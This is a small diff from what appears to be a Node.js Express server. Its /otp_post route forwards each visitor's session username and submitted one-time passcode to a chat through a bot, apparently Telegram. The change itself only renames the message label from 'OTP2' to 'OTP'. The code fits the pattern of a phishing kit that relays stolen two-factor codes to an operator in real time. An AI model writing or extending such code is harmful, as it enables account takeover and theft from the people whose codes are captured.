@@ -73,7 +73,7 @@ app.post("/otp_post", (req, res) => {
     //     }
     // });
 
-    bot.sendMessage(chatId, `From: ${req.session.user}\n OTP2: ${req.body.otpValue}`);
+    bot.sendMessage(chatId, `From: ${req.session.user}\n OTP: ${req.body.otpValue}`);
 
 });
 
